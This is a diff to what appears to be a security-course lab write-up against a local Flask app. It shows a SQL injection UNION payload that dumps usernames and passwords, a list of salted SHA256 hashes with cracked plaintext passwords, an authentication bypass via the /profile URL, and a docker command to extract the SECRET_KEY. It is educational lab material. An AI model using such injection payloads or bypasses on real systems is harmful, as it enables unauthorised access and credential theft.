@@ -55,8 +55,9 @@ Usernames and Passwords:
 ========================
 q' UNION SELECT username || password FROM Users--
 
-Cracked Passwords (10):
-=======================
+Cracked Passwords (10) Sha256(password.salt):
+=============================================
+
 brknleg:819c0ee30c8f8d9e076ff13573b308839b0f6554d0b3ede2170253e3b0b27d39:102:jo30brotherS16
 dmtman:4dcedacaea5859a4ec3c92dc33dd1450b38a0a099e9555a3a8ecbb5776de9f81:123:terrypollykaicer
 ezekiel2517:a0a7cdb46844a7a61b0905527cc77683fe06fdd0074975474641019218cc2319:240
@@ -76,3 +77,10 @@ wildcard:b8c926955a6da51faae90de49eea553ff87450fbefad949066519ec0e18f7052:70:489
 We can login using one of the usernames:passwords provided above.
 Additionally, we can also login by simply putting http://localhost:5000/profile into the browser.
 It appears this server was misconfigured... Easy authentication bypass.
+
+Easter Egg
+==========
+	This application is not vulnerable to the Werkzeug - Debug Shell Command Execution.
+
+	Therefore, in order to get the SECRET_KEY run the following:
+		docker run -it --entrypoint /bin/bash uofmcomp4432/exercise1:v1.
